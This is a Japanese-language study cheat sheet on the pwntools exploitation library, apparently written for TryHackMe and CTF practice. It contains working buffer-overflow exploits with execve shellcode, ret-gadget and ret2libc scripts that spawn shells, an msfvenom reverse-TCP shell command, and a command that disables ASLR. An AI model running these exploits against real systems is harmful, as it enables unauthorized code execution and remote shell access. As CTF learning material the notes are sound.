# pwntools

https://github.com/Gallopsled/pwntools

https://tryhackme.com/room/introtopwntools

## インストール

kali の場合、pwn と打ってインストールされていなければインストールするか聞かれるので Yes と答えるだけ。

## コマンド

### checksec

```shell
# 実行ファイルで有効になっているセキュリティ機構を調べる
checksec --file <file>
```

- RELRO: RELRO があれば、GOT が読み取り、書き込み可能
- Stack: canary が有効かどうか
- NX: 有効ならスタックのコード実行（シェルコード挿入）ができない
- PIE: ASLR（アドレス空間のランダム化）が有効かどうか

### cyclic

```shell
cyclic 100 > pattern

cat pattern
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

```shell
# バッファオーバーフローをテストする
gdb> r < pattern
```

eip が `jaaa` で上書きされていたとして、その部分を目的の関数アドレスにしたペイロードを作成したい場合。

```python
# gdb> disassemble <function> 等で関数アドレスを得る
from pwn import *

padding = cyclic(cyclic_find('jaaa'))
eip = p32(0x08048536)
payload = padding + eip
print(payload)
```

### shellcraft

64 ビットの場合、amd64.linux.execve

```shell
# シェルコードのアセンブラ出力
pwn shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a

# シェルコードのバイトコード出力
pwn shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s

# \xNN の形に統一
pwn shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f s | python3 -c "import sys; from codecs import decode; s=sys.stdin.read().strip()[2:-1]; print(''.join(f'\\x{b:02x}' for b in decode(s, 'unicode_escape')))"
```

```shell
# SETREUID のシェルコード出力
pwn shellcraft -f d amd64.linux.setreuid 1002
```

シェルコードを埋め込む例

```python
from pwn import *

proc = process('./intro2pwnFinal')
proc.recvline()

padding = cyclic(cyclic_find('taaa'))
eip = p32(0xffffd510+200)
nop_slide = "\x90"*1000
# ブレークポイント命令（シェルコードを入れる前のテスト用）
# shellcode = "\xcc"
shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
payload = padding + eip + nop_slide + shellcode

proc.send(payload)

# シェルと通信するためインタラクティブが必要
proc.interactive()
```

（参考）msfvenom によるシェルコード生成。pwn を使わず標準入力から流し込む場合に役立つ。

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.85.243 LPORT=8888 -b '\x00' -f python
```

（参考）ASLR（アドレス空間配置のランダム化）無効化

```shell
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

## ネットワーク経由

```python
from pwn import *

connect = remote('127.0.0.1', 1336)
print(connect.recvn(18))
payload = "A"*32
payload += p32(0xdeadbeef)
connect.send(payload)

print(connect.recvn(34))
```

## バイナリ解析

```python
# ライブラリをロード
>>> from pwn import *

# バイナリをロード
>>> binary = context.binary = ELF("./elf_file")

# 関数のアドレス
>>> hex(binary.symbols['vuln'])

# retガジェット
>>> ret_gadget = ROP(binary).find_gadget(['ret'])[0]
```

## 例

### バッファオーバーフロー

```shell
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.37.23"
port = 5700
context(terminal = ['tmux', 'new-window'])

binary = context.binary = ELF("./DearQA-1627223337406.DearQA")
context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")
payload = b'A' * 40
payload += p64(0x00400686)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

上記の例で、binary と 2 か所の context は、コメントアウトしても機能する。

### ret ガジェット

64 ビット OS で、RSP が 16 バイト境界にない場合、ret ガジェットが必要になる。

RSP 0x7fffffffdcf8 　のように、末尾が 0 出ない場合ずれている。

```python
from pwn import *

# Set the binary context
elf = context.binary = ELF('./tryretme')  # Replace with the actual binary name

# Connect to the remote server
p = remote('10.10.23.250', 9006)

# Address of the win function
win_addr = elf.symbols['win']

# Address of a `ret` gadget (you can find this with tools like ROPgadget or Pwntools)
# This gadget is simply one instruction: `ret`, which fixes stack alignment.
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# Offset (determined from cyclic_find)
offset = 264

# Payload: buffer + ret gadget + return address (win function)
payload = b'A' * offset
payload += p64(ret_gadget)  # Add the ret gadget to fix alignment
payload += p64(win_addr)

# Send the payload
p.sendlineafter('Return to where? : ', payload)

# Interact with the shell
p.interactive()
```

### 受信したデータをペイロードに反映する

TryPwnMeOne CTF 参照。

```python
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.61.104"
port = 9007

vuln_addr = 0x1319
win_addr = 0x1210
ret_gadget = 0x101a

context(os = "linux", arch = "amd64")
connect = remote(host, port)

# vuln関数アドレスを表示する行を受信するまで待つ
while True:
    line = connect.recvline().decode()
    log.info(f"{line.strip()}")
    if "I can give you a secret" in line:
        break

# アドレス部分（16進数）を抽出
match = re.search(r"I can give you a secret ([0-9a-fA-F]+)", line)
if match:
    vuln_abs_addr = int(match.group(1), 16)
    log.info(f"[+] vuln address: {hex(vuln_abs_addr)}")
    offset = vuln_abs_addr - vuln_addr
else:
    log.error("vulnアドレスの抽出に失敗しました")
    sys.exit(1)

log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"Where are we going? : ")
log.info("[+] Crafting payload")
payload = b'A' * (256+8)

payload += p64(offset + ret_gadget) # retガジェット
payload += p64(offset + win_addr)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

### ret2libc

```python
#!/usr/bin/env python3
from pwn import *

context.binary = binary = './exploit_me'

elf = ELF(binary)
rop = ROP(elf)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process()

padding = b'A'*18
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(elf.got.gets)
payload += p64(elf.plt.puts)
payload += p64(elf.symbols.main)

p.recvline()
p.sendline(payload)
p.recvline()
leak = u64(p.recvline().strip().ljust(8,b'\0'))
p.recvline()

log.info(f'Gets leak => {hex(leak)}')
libc.address = leak - libc.symbols.gets
log.info(f'Libc base => {hex(libc.address)}')

payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(libc.symbols.system)

p.sendline(payload)
p.recvline()
p.interactive()
```
